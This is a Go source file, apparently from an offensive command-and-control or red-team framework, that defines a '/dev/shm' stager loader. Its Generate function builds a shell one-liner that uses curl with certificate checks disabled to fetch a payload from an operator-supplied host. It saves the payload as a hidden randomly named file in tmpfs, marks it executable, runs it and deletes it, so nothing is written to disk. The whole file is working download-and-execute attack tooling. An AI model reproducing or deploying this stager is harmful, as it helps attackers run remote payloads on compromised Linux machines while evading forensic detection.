package loader

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

type devshmLoader struct{}

func init() { Register(&devshmLoader{}) }

func (d *devshmLoader) Name() string        { return "devshm" }
func (d *devshmLoader) Description() string { return "/dev/shm staging (tmpfs, no disk write)" }
func (d *devshmLoader) RequiresTool() string { return "curl" }

func (d *devshmLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (d *devshmLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return "", fmt.Errorf("generate random name: %w", err)
	}
	name := hex.EncodeToString(b)
	return fmt.Sprintf(
		`curl -sk https://%s:%s/p/%s -o /dev/shm/.%s;chmod +x /dev/shm/.%s;/dev/shm/.%s;rm -f /dev/shm/.%s`,
		opts.Host, opts.Port, opts.Token, name, name, name, name,
	), nil
}
